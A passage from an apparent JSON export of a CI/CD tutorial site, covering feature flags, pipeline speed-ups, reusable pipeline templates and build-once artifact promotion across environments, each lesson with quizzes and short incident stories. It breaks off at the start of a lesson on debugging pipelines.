Release flag Hide unfinished or risky work Days to weeks, then delete Experiment flag Compare variants Until the result is known Operational flag (kill switch) Turn off an expensive or risky path in an incident Long Permission flag Enable for a plan or customer Long, part of the product Each flag needs an owner, a purpose and a removal date. Old release flags leave dead code and untested combinations, which is called flag debt. Review flags regularly and delete them. Environments and promotion Keep environments few and similar: development, staging (production-like), production. Promote the same built artifact through them, and change only configuration. Do not rebuild for each environment. Approvals should match risk: automatic for low-risk changes with good tests; a human check for changes to payments or data schemas. Record who approved what, and when. Progressive delivery Canary: send a small share of traffic to the new version and watch error rate and latency. Rings: release to internal users, then a small group, then everyone. Automatic rollback: if a metric crosses a threshold during rollout, the system stops or reverts without a human. Percentage rollouts by stable hash: hash the user id, so a user keeps the same experience. Versions and rollbacks Use semantic versions or build ids that map exactly to a commit. Keep the previous version ready, and make database changes backwards compatible (add a column first, switch code, remove the old column later) so a rollback of code is always possible. Predict first. A release changes a database column name and the code at the same time. Why does a rollback fail? Your guess Answer: The old code expects the old column name, which no longer exists, so rolling back the code breaks it. Use an expand and contract approach: add the new column, write to both, switch reads, and remove the old column in a later release. Incident: the feature that could not be switched off Incident A new pricing calculation shows wrong totals to 30 percent of customers after a release, and turning it off takes two hours. $ flagctl list --stale new-pricing owner: pay-team created: 2026-02-10 100% on legacy-discount owner: (none) created: 2024-06-01 100% on The change shipped without a flag, so the only remedy was a rollback that also removed other fixes. Afterwards the team required a flag for risky behaviour changes, added a kill switch for pricing, ran a canary with an automatic abort on error rate, and set a monthly flag clean-up. Common mistakes No safe default when the flag service fails Flags without owners or removal dates Rebuilding the artifact for each environment Database changes that block rollback"},"cicd/fast-pipelines-caching-parallelism-monorepos":{"html":"\u003cp>A pipeline that takes forty minutes teaches people to batch changes, skip tests and stop trusting the result. Fast feedback is a quality feature. The good news is that most slow pipelines waste time in a few predictable places, and you can fix them one by one.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Measuring a pipeline before changing it\u003c/li>\n\u003cli>Parallel jobs and test sharding\u003c/li>\n\u003cli>Dependency and build caches that are correct\u003c/li>\n\u003cli>Running only what changed in a monorepo\u003c/li>\n\u003cli>Runner sizing and keeping images small\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"measure-first\">Measure first\u003c/h2>\n\u003cp>Write down the duration of each stage over the last twenty runs. Look at the median and at the slowest run, not the best. The usual suspects: installing dependencies, building images from scratch, a long single test job, waiting for a shared runner, and slow end-to-end tests. Fix the biggest first.\u003c/p>\n\u003ch2 id=\"parallelism\">Parallelism\u003c/h2>\n\u003cp>Jobs that do not depend on each other should run at the same time: lint, unit tests, type checks, and security scans. Split a long test job into shards (for example four jobs, each running a quarter of the tests, balanced by recorded duration):\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"test:\n  parallel: 4\n  script:\n    - ./run-tests.sh --shard $SHARD_INDEX/$SHARD_TOTAL\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">test:\u003c/span>\n  \u003cspan class=\"hljs-attr\">parallel:\u003c/span> \u003cspan class=\"hljs-number\">4\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">./run-tests.sh\u003c/span> \u003cspan class=\"hljs-string\">--shard\u003c/span> \u003cspan class=\"hljs-string\">$SHARD_INDEX/$SHARD_TOTAL\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Keep the number of parallel jobs below your runner capacity, or jobs wait in a queue and the gain disappears.\u003c/p>\n\u003ch2 id=\"caching-correctly\">Caching correctly\u003c/h2>\n\u003cp>A cache must be fast and must never serve stale or poisoned data. Rules:\u003c/p>\n\u003cul>\n\u003cli>Key dependency caches on a hash of the lockfile, so a change in dependencies creates a new cache.\u003c/li>\n\u003cli>Cache the package manager&#39;s download directory, not the installed project.\u003c/li>\n\u003cli>Use read-only caches for pull request builds when you worry about cache poisoning from untrusted code.\u003c/li>\n\u003cli>For container builds, use a registry cache (see the lesson on BuildKit).\u003c/li>\n\u003cli>Build tools such as Bazel, Gradle and Nx have remote caches that reuse build and test results by input hash.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"monorepos-only-run-what-changed\">Monorepos: only run what changed\u003c/h2>\n\u003cp>In a repository with many services, build and test only what a change can affect:\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"rules:\n  - changes: [&quot;services/payments/**/*&quot;, &quot;libs/common/**/*&quot;]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">rules:\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">changes:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;services/payments/**/*&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;libs/common/**/*&quot;\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Dependency-aware tools (Nx, Bazel, Turborepo) compute the affected targets from the dependency graph. Be careful: if a shared library changes, all dependents must run. Always run the full pipeline on the main branch on a schedule to catch gaps in the rules.\u003c/p>\n\u003ch2 id=\"other-savings\">Other savings\u003c/h2>\n\u003cul>\n\u003cli>Use a small, prebuilt image with your tools instead of installing them in each run.\u003c/li>\n\u003cli>Run slow end-to-end tests after merge or on a schedule, and keep a small smoke test on each change.\u003c/li>\n\u003cli>Cancel old runs when a new commit arrives for the same branch.\u003c/li>\n\u003cli>Use larger runners for heavy builds; one four-core job may be cheaper than a sixteen-minute two-core job.\u003c/li>\n\u003cli>Fail fast: run the cheapest checks first.\u003c/li>\n\u003c/ul>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Your dependency cache key is only the branch name. What goes wrong?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> When the lockfile changes, the old cache is reused, so builds use outdated dependencies, or fail in confusing ways.\u003c/p>\u003cp>Include a hash of the lockfile in the key.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-thirty-eight-minute-pipeline\">Incident: the thirty-eight minute pipeline\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A team&#39;s merge request pipeline grows to 38 minutes, and developers start merging without waiting for it.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">stage        median   p95\u003c/span>\u003cspan class=\"ln out\">install      9m       14m\u003c/span>\u003cspan class=\"ln out\">unit tests   16m      19m\u003c/span>\u003cspan class=\"ln out\">e2e          10m      22m\u003c/span>\u003cspan class=\"ln out\">build image  3m       5m\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Dependencies were reinstalled each run, the unit tests ran in one job and the end-to-end tests ran on every change. The team cached by lockfile hash (install fell to one minute), sharded unit tests into four jobs (to five minutes), moved most end-to-end tests to run after merge, kept three smoke tests on each change, and canceled outdated runs. The median fell to eleven minutes, and people started to wait for it again.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Optimising without measuring\u003c/li>\n\u003cli>Caches that can be poisoned or stale\u003c/li>\n\u003cli>More parallel jobs than runners\u003c/li>\n\u003cli>Skipping the full run for the monorepo\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"measure-first","text":"Measure first"},{"id":"parallelism","text":"Parallelism"},{"id":"caching-correctly","text":"Caching correctly"},{"id":"monorepos-only-run-what-changed","text":"Monorepos: only run what changed"},{"id":"other-savings","text":"Other savings"},{"id":"incident-the-thirty-eight-minute-pipeline","text":"Incident: the thirty-eight minute pipeline"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Continuous Delivery: Deployment pipeline","u":"https://continuousdelivery.com/implementing/patterns/"},{"t":"DORA research","u":"https://dora.dev/"}],"text":"A pipeline that takes forty minutes teaches people to batch changes, skip tests and stop trusting the result. Fast feedback is a quality feature. The good news is that most slow pipelines waste time in a few predictable places, and you can fix them one by one. What you will learn Measuring a pipeline before changing it Parallel jobs and test sharding Dependency and build caches that are correct Running only what changed in a monorepo Runner sizing and keeping images small Measure first Write down the duration of each stage over the last twenty runs. Look at the median and at the slowest run, not the best. The usual suspects: installing dependencies, building images from scratch, a long single test job, waiting for a shared runner, and slow end-to-end tests. Fix the biggest first. Parallelism Jobs that do not depend on each other should run at the same time: lint, unit tests, type checks, and security scans. Split a long test job into shards (for example four jobs, each running a quarter of the tests, balanced by recorded duration): test: parallel: 4 script: - ./run-tests.sh --shard $SHARD_INDEX/$SHARD_TOTAL Keep the number of parallel jobs below your runner capacity, or jobs wait in a queue and the gain disappears. Caching correctly A cache must be fast and must never serve stale or poisoned data. Rules: Key dependency caches on a hash of the lockfile, so a change in dependencies creates a new cache. Cache the package manager&#39;s download directory, not the installed project. Use read-only caches for pull request builds when you worry about cache poisoning from untrusted code. For container builds, use a registry cache (see the lesson on BuildKit). Build tools such as Bazel, Gradle and Nx have remote caches that reuse build and test results by input hash. Monorepos: only run what changed In a repository with many services, build and test only what a change can affect: rules: - changes: [ \"services/payments/**/*\" , \"libs/common/**/*\" ] Dependency-aware tools (Nx, Bazel, Turborepo) compute the affected targets from the dependency graph. Be careful: if a shared library changes, all dependents must run. Always run the full pipeline on the main branch on a schedule to catch gaps in the rules. Other savings Use a small, prebuilt image with your tools instead of installing them in each run. Run slow end-to-end tests after merge or on a schedule, and keep a small smoke test on each change. Cancel old runs when a new commit arrives for the same branch. Use larger runners for heavy builds; one four-core job may be cheaper than a sixteen-minute two-core job. Fail fast: run the cheapest checks first. Predict first. Your dependency cache key is only the branch name. What goes wrong? Your guess Answer: When the lockfile changes, the old cache is reused, so builds use outdated dependencies, or fail in confusing ways. Include a hash of the lockfile in the key. Incident: the thirty-eight minute pipeline Incident A team&#39;s merge request pipeline grows to 38 minutes, and developers start merging without waiting for it. stage median p95 install 9m 14m unit tests 16m 19m e2e 10m 22m build image 3m 5m Dependencies were reinstalled each run, the unit tests ran in one job and the end-to-end tests ran on every change. The team cached by lockfile hash (install fell to one minute), sharded unit tests into four jobs (to five minutes), moved most end-to-end tests to run after merge, kept three smoke tests on each change, and canceled outdated runs. The median fell to eleven minutes, and people started to wait for it again. Common mistakes Optimising without measuring Caches that can be poisoned or stale More parallel jobs than runners Skipping the full run for the monorepo"},"cicd/reusable-pipelines-and-templates":{"html":"\u003cp>Forty services each have their own copy of a build pipeline. When the security team needs a new scan step, forty files have to change, and thirty-one of them differ slightly. Reusable pipelines solve this the same way libraries solve repeated code: write once, version, and let teams call it.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Why copy and paste pipelines drift and hurt\u003c/li>\n\u003cli>Shared templates and reusable workflows with inputs\u003c/li>\n\u003cli>Versioning shared pipeline code so changes are safe\u003c/li>\n\u003cli>Guard rails: what to enforce centrally and what to leave to teams\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-cost-of-copied-pipelines\">The cost of copied pipelines\u003c/h2>\n\u003cp>Copying a pipeline looks free on day one. Over time the copies diverge: one service pins a tool version, another does not, a third skips the scan &quot;temporarily&quot; and never turns it back on. When a fix is needed, you must find every copy, and each one needs its own review. Inconsistent pipelines also make audits hard, because you cannot say &quot;all services run a vulnerability scan&quot; with confidence.\u003c/p>\n\u003ch2 id=\"templates-with-inputs\">Templates with inputs\u003c/h2>\n\u003cp>Most CI systems let one pipeline include another and pass inputs. The details differ, but the shape is the same: a central definition, and a short file in each service that says what to build.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# in the service repository\ninclude: shared/pipelines/build-and-test.yml@v3\nvariables:\n  LANGUAGE: python\n  PYTHON_VERSION: &quot;3.12&quot;\n  DEPLOY_TARGET: staging\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># in the service repository\u003c/span>\n\u003cspan class=\"hljs-attr\">include:\u003c/span> \u003cspan class=\"hljs-string\">shared/pipelines/build-and-test.yml@v3\u003c/span>\n\u003cspan class=\"hljs-attr\">variables:\u003c/span>\n  \u003cspan class=\"hljs-attr\">LANGUAGE:\u003c/span> \u003cspan class=\"hljs-string\">python\u003c/span>\n  \u003cspan class=\"hljs-attr\">PYTHON_VERSION:\u003c/span> \u003cspan class=\"hljs-string\">&quot;3.12&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">DEPLOY_TARGET:\u003c/span> \u003cspan class=\"hljs-string\">staging\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The shared template contains the steps: checkout, cache, build, test, scan, publish. Inputs let a team choose the language or the target, but they cannot remove the scan step. Keep inputs few and typed. A template with forty options is a configuration language nobody can read.\u003c/p>\n\u003ch2 id=\"version-the-shared-code\">Version the shared code\u003c/h2>\n\u003cp>A change to a shared pipeline affects every user at once, so treat it like a library release. Tag versions (\u003ccode>v3\u003c/code>, \u003ccode>v3.2.1\u003c/code>), publish release notes, and let teams pin a major version. Test the template itself on a sample project before you tag it. Roll out breaking changes as a new major version, and give teams time and a migration note to move.\u003c/p>\n\u003cp>A safe pattern is \u003cem>canary then fleet\u003c/em>: move two or three friendly services to the new version, watch their runs for a week, and then update the default.\u003c/p>\n\u003ch2 id=\"guard-rails-not-handcuffs\">Guard rails, not handcuffs\u003c/h2>\n\u003cp>Decide what must be the same everywhere: the security scan, artifact signing, the rule that production deploys need a reviewed commit on the main branch, and the audit log. Make those parts of the template, or enforce them with a required check on every repository.\u003c/p>\n\u003cp>Leave the rest to teams: extra test stages, extra environments, and tools specific to their language. If teams must fight the template to do their job, they will fork it, and you are back to copies. Measure adoption, for example the share of pipelines on the current version, and treat it as a service you run for the other teams.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A shared template adds a new mandatory scan, and 12 pipelines fail on their next run. How could the rollout have been safer?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Release it as a new version, test on a few canary services, report findings without failing for a trial period, then make it required with notice.\u003c/p>\u003cp>Shared changes need versioning, canaries and a soft launch.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-one-edit-forty-broken-builds\">Incident: One edit, forty broken builds\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A platform engineer renamed a variable in the shared template. Within an hour, forty services could not deploy.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"ci run --pipeline checkout --branch main\ngrep -c &quot;@main&quot; services/*/ci.yml | grep -v &quot;:0&quot; | wc -l\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>ci run --pipeline checkout --branch main\u003c/span>\u003cspan class=\"ln out\">error: variable DEPLOY_ENV is not defined (template build-and-test.yml@main)\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>grep -c \u003cspan class=\"hljs-string\">&quot;@main&quot;\u003c/span> services/*/ci.yml | grep -v \u003cspan class=\"hljs-string\">&quot;:0&quot;\u003c/span> | \u003cspan class=\"hljs-built_in\">wc\u003c/span> -l\u003c/span>\u003cspan class=\"ln out\">40\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Every service referred to the template by the moving name \u003ccode>main\u003c/code>, so the change reached all of them immediately. The fix was to revert the rename and to require version tags in \u003ccode>include\u003c/code> lines, with a lint check that rejects \u003ccode>@main\u003c/code>. Breaking changes now go out as a new major version, and a weekly report shows how many pipelines still use each version.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Referring to a template by a moving branch name\u003c/li>\n\u003cli>Giving the template dozens of options\u003c/li>\n\u003cli>Making every team copy the file because the shared one is hard to change\u003c/li>\n\u003cli>Enforcing nothing centrally, so the scan quietly disappears from some services\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-cost-of-copied-pipelines","text":"The cost of copied pipelines"},{"id":"templates-with-inputs","text":"Templates with inputs"},{"id":"version-the-shared-code","text":"Version the shared code"},{"id":"guard-rails-not-handcuffs","text":"Guard rails, not handcuffs"},{"id":"incident-one-edit-forty-broken-builds","text":"Incident: One edit, forty broken builds"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Continuous Delivery by Jez Humble and Dave Farley","u":"https://continuousdelivery.com/"},{"t":"The DORA research programme","u":"https://dora.dev/"}],"text":"Forty services each have their own copy of a build pipeline. When the security team needs a new scan step, forty files have to change, and thirty-one of them differ slightly. Reusable pipelines solve this the same way libraries solve repeated code: write once, version, and let teams call it. What you will learn Why copy and paste pipelines drift and hurt Shared templates and reusable workflows with inputs Versioning shared pipeline code so changes are safe Guard rails: what to enforce centrally and what to leave to teams The cost of copied pipelines Copying a pipeline looks free on day one. Over time the copies diverge: one service pins a tool version, another does not, a third skips the scan \"temporarily\" and never turns it back on. When a fix is needed, you must find every copy, and each one needs its own review. Inconsistent pipelines also make audits hard, because you cannot say \"all services run a vulnerability scan\" with confidence. Templates with inputs Most CI systems let one pipeline include another and pass inputs. The details differ, but the shape is the same: a central definition, and a short file in each service that says what to build. # in the service repository include: shared/pipelines/build-and-test.yml@v3 variables: LANGUAGE: python PYTHON_VERSION: \"3.12\" DEPLOY_TARGET: staging The shared template contains the steps: checkout, cache, build, test, scan, publish. Inputs let a team choose the language or the target, but they cannot remove the scan step. Keep inputs few and typed. A template with forty options is a configuration language nobody can read. Version the shared code A change to a shared pipeline affects every user at once, so treat it like a library release. Tag versions ( v3 , v3.2.1 ), publish release notes, and let teams pin a major version. Test the template itself on a sample project before you tag it. Roll out breaking changes as a new major version, and give teams time and a migration note to move. A safe pattern is canary then fleet : move two or three friendly services to the new version, watch their runs for a week, and then update the default. Guard rails, not handcuffs Decide what must be the same everywhere: the security scan, artifact signing, the rule that production deploys need a reviewed commit on the main branch, and the audit log. Make those parts of the template, or enforce them with a required check on every repository. Leave the rest to teams: extra test stages, extra environments, and tools specific to their language. If teams must fight the template to do their job, they will fork it, and you are back to copies. Measure adoption, for example the share of pipelines on the current version, and treat it as a service you run for the other teams. Predict first. A shared template adds a new mandatory scan, and 12 pipelines fail on their next run. How could the rollout have been safer? Your guess Answer: Release it as a new version, test on a few canary services, report findings without failing for a trial period, then make it required with notice. Shared changes need versioning, canaries and a soft launch. Incident: One edit, forty broken builds Incident A platform engineer renamed a variable in the shared template. Within an hour, forty services could not deploy. $ ci run --pipeline checkout --branch main error: variable DEPLOY_ENV is not defined (template build-and-test.yml@main) $ grep -c \"@main\" services/*/ci.yml | grep -v \":0\" | wc -l 40 Every service referred to the template by the moving name main , so the change reached all of them immediately. The fix was to revert the rename and to require version tags in include lines, with a lint check that rejects @main . Breaking changes now go out as a new major version, and a weekly report shows how many pipelines still use each version. Common mistakes Referring to a template by a moving branch name Giving the template dozens of options Making every team copy the file because the shared one is hard to change Enforcing nothing centr"},"cicd/environments-promotion-and-approvals":{"html":"\u003cp>The release checklist says &quot;deploy to staging, test, deploy to production&quot;, but each deploy rebuilds the code and picks up slightly different dependencies. What passed in staging is not exactly what reaches production. Promotion fixes this: build once, then move the same artifact through environments, with a gate at each step.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>What an environment is and how many you need\u003c/li>\n\u003cli>Promote the same artifact instead of rebuilding\u003c/li>\n\u003cli>Automatic gates and human approvals, and when to use each\u003c/li>\n\u003cli>Records: who approved what, and what is running where\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"environments-and-their-purpose\">Environments and their purpose\u003c/h2>\n\u003cp>An environment is a place where the application runs with its own configuration and data. Common ones are \u003cstrong>dev\u003c/strong> (fast, breakable), \u003cstrong>test\u003c/strong> or \u003cstrong>staging\u003c/strong> (production-like, used for final checks) and \u003cstrong>production\u003c/strong>. Add more only when a stage has a real purpose, such as performance testing or a customer demo. Each extra environment costs money and attention, and an environment that drifts from production gives false confidence.\u003c/p>\n\u003cp>Keep differences between environments in configuration (addresses, sizes, secrets), not in code, and keep configuration in files that are reviewed like code.\u003c/p>\n\u003ch2 id=\"build-once-promote-many-times\">Build once, promote many times\u003c/h2>\n\u003cp>The pipeline builds an artifact (a container image or package) one time, gives it a version, and records its digest. Every later stage deploys exactly that artifact. Only the configuration changes.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"build  -&gt;  image shop@sha256:9f2c...  -&gt;  dev  -&gt;  staging  -&gt;  production\n                                          ^ tests    ^ checks     ^ approval\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">build  -&gt;  image shop@sha256:9f2c...  -&gt;  dev  -&gt;  staging  -&gt;  production\n                                          ^ tests    ^ checks     ^ approval\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>If a bug is found in staging, you fix it in code, build a new artifact, and start the journey again. You never patch an artifact on its way to production. Promotion by digest also gives you rollback for free: the previous digest is known and was already tested.\u003c/p>\n\u003ch2 id=\"gates-automatic-and-human\">Gates: automatic and human\u003c/h2>\n\u003cp>A \u003cstrong>gate\u003c/strong> is a condition for moving to the next environment.\u003c/p>\n\u003cul>\n\u003cli>Automatic gates: tests pass, scan has no critical findings, smoke test on the new environment, error rate normal for ten minutes.\u003c/li>\n\u003cli>Human approvals: needed where a person must judge risk, for example a database migration or a change in a regulated system.\u003c/li>\n\u003c/ul>\n\u003cp>Use automation wherever the answer can be computed, because people approving everything become a rubber stamp. When a human approves, show the evidence: what changed, test results, the risk, and the rollback plan. The approver should not be the author. Also define an emergency path with fewer steps but the same record, so that urgent fixes do not tempt people to bypass the pipeline.\u003c/p>\n\u003ch2 id=\"know-what-runs-where\">Know what runs where\u003c/h2>\n\u003cp>At any moment you should be able to answer: which version runs in production, who approved it, and which commit it came from. Record deploy events (environment, version, time, approver) in one place, and show the current versions on a dashboard. Add a deploy marker to monitoring graphs, so that a change in error rate can be tied to a release within seconds. For audits, keep the approval and test evidence with the release for the period the rules require.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Staging uses a build from Monday, but production gets a build from Tuesday made from the same branch. What risk did you create?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Production runs code and dependencies that were never tested in staging. Promote the same artifact instead of rebuilding.\u003c/p>\u003cp>Rebuilding for each environment breaks the link between test and release.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-tested-in-staging-broken-in-production\">Incident: Tested in staging, broken in production\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A release passed every staging check and failed on its first request in production with a missing library.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"docker inspect --format &quot;{{.Image}}&quot; staging-shop prod-shop\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker inspect --format \u003cspan class=\"hljs-string\">&quot;{{.Image}}&quot;\u003c/span> staging-shop prod-shop\u003c/span>\u003cspan class=\"ln out\">sha256:41aa...\u003c/span>\u003cspan class=\"ln out\">sha256:b072...\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Staging and production ran different images. The pipeline had one job per environment and each job ran its own \u003ccode>docker build\u003c/code>. A transitive dependency was released between the two builds. The team changed the pipeline to build once, push the image with its digest, and deploy that digest to each environment, and a check now fails the production deploy if the digest was not first deployed and tested in staging.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Rebuilding the artifact for each environment\u003c/li>\n\u003cli>Letting staging drift away from production\u003c/li>\n\u003cli>Approvals without evidence, so people click through\u003c/li>\n\u003cli>No emergency path, which leads to bypassing the pipeline\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"environments-and-their-purpose","text":"Environments and their purpose"},{"id":"build-once-promote-many-times","text":"Build once, promote many times"},{"id":"gates-automatic-and-human","text":"Gates: automatic and human"},{"id":"know-what-runs-where","text":"Know what runs where"},{"id":"incident-tested-in-staging-broken-in-production","text":"Incident: Tested in staging, broken in production"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Continuous Delivery","u":"https://continuousdelivery.com/"},{"t":"Twelve-Factor App: Config","u":"https://12factor.net/config"}],"text":"The release checklist says \"deploy to staging, test, deploy to production\", but each deploy rebuilds the code and picks up slightly different dependencies. What passed in staging is not exactly what reaches production. Promotion fixes this: build once, then move the same artifact through environments, with a gate at each step. What you will learn What an environment is and how many you need Promote the same artifact instead of rebuilding Automatic gates and human approvals, and when to use each Records: who approved what, and what is running where Environments and their purpose An environment is a place where the application runs with its own configuration and data. Common ones are dev (fast, breakable), test or staging (production-like, used for final checks) and production . Add more only when a stage has a real purpose, such as performance testing or a customer demo. Each extra environment costs money and attention, and an environment that drifts from production gives false confidence. Keep differences between environments in configuration (addresses, sizes, secrets), not in code, and keep configuration in files that are reviewed like code. Build once, promote many times The pipeline builds an artifact (a container image or package) one time, gives it a version, and records its digest. Every later stage deploys exactly that artifact. Only the configuration changes. build -> image shop@sha256:9f2c... -> dev -> staging -> production ^ tests ^ checks ^ approval If a bug is found in staging, you fix it in code, build a new artifact, and start the journey again. You never patch an artifact on its way to production. Promotion by digest also gives you rollback for free: the previous digest is known and was already tested. Gates: automatic and human A gate is a condition for moving to the next environment. Automatic gates: tests pass, scan has no critical findings, smoke test on the new environment, error rate normal for ten minutes. Human approvals: needed where a person must judge risk, for example a database migration or a change in a regulated system. Use automation wherever the answer can be computed, because people approving everything become a rubber stamp. When a human approves, show the evidence: what changed, test results, the risk, and the rollback plan. The approver should not be the author. Also define an emergency path with fewer steps but the same record, so that urgent fixes do not tempt people to bypass the pipeline. Know what runs where At any moment you should be able to answer: which version runs in production, who approved it, and which commit it came from. Record deploy events (environment, version, time, approver) in one place, and show the current versions on a dashboard. Add a deploy marker to monitoring graphs, so that a change in error rate can be tied to a release within seconds. For audits, keep the approval and test evidence with the release for the period the rules require. Predict first. Staging uses a build from Monday, but production gets a build from Tuesday made from the same branch. What risk did you create? Your guess Answer: Production runs code and dependencies that were never tested in staging. Promote the same artifact instead of rebuilding. Rebuilding for each environment breaks the link between test and release. Incident: Tested in staging, broken in production Incident A release passed every staging check and failed on its first request in production with a missing library. $ docker inspect --format \"{{.Image}}\" staging-shop prod-shop sha256:41aa... sha256:b072... Staging and production ran different images. The pipeline had one job per environment and each job ran its own docker build . A transitive dependency was released between the two builds. The team changed the pipeline to build once, push the image with its digest, and deploy that digest to each environment, and a check now fails the production deploy if the digest was not first deployed and tested in staging. Common mistakes Reb"},"cicd/debugging-pipelines":{"html":"\u003cp>Pipelines fail for reasons that have nothing to do with your change: a cache that went stale, a dependency that moved, a runner that ran out of disk, or a test that depends on timing. If you cannot tell a real failure from noise, people start re-running until green, and real problems pass through.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Reading a failing job from the first error, not the last line\u003c/li>\n\u003cli>Reproducing a failure outside the pipeline\u003c/li>\n\u003cli>Flaky tests, cache problems and drift between local and CI\u003c/li>\n\u003cli>Debugging secrets and permissions without printing them\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"read-the-first-error\">Read the first error\u003c/h2>\n\u003cp>The last lines of a job often say only &quot;exit code 1&quot;. The cause is higher up. 